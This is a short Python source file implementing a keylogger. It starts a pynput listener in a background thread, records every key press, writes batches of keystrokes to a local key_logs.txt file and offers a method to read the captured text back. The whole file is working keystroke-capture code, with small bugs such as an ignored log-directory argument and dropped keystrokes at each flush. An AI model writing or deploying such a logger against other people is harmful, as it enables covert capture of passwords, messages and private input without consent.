import os
import pathlib
from time import sleep
import pynput
import threading


class KeyLogger:
    def __init__(self, log_dir=None) -> None:
        self.__file_in_use = False
        self.__buffer: list[str] = []
        self.__count: int = 0
        self.__log_dir = pathlib.Path(".", "key_logs.txt")
        if log_dir is not None:
            __log_dir = log_dir
    
    def __on_press(self, key) -> None:
        if self.__count == 100:
            self.__count = 0
            while self.__file_in_use:
                sleep(0.01)
            self.__file_in_use = True
            with open(self.__log_dir, "a") as f:
                for i in self.__buffer:
                    f.write(i + ' ')
                self.__buffer = []
            self.__file_in_use = False
        else:
            self.__count += 1
            self.__buffer.append(str(key))

    def __main_loop(self):
        with pynput.keyboard.Listener(on_press=self.__on_press) as listener:
            listener.join()
    
    def start(self):
        try:
            threading.Thread(target=(self.__main_loop)).start()
        except Exception as err:
            return(err)

    def get_keylogs(self) -> str:
        try:
            while self.__file_in_use:
                sleep(0.01)
            self.__file_in_use = True
            logs = ""
            if os.path.exists(self.__log_dir):
                with open(self.__log_dir, "r") as f:
                    logs: str = f.read()
            self.__file_in_use = False
            logs = logs + " ".join(self.__buffer)
            return logs
        except Exception as err:
            print(err)
            return str(err)


if __name__ == "__main__":
    a = KeyLogger()
    a.start()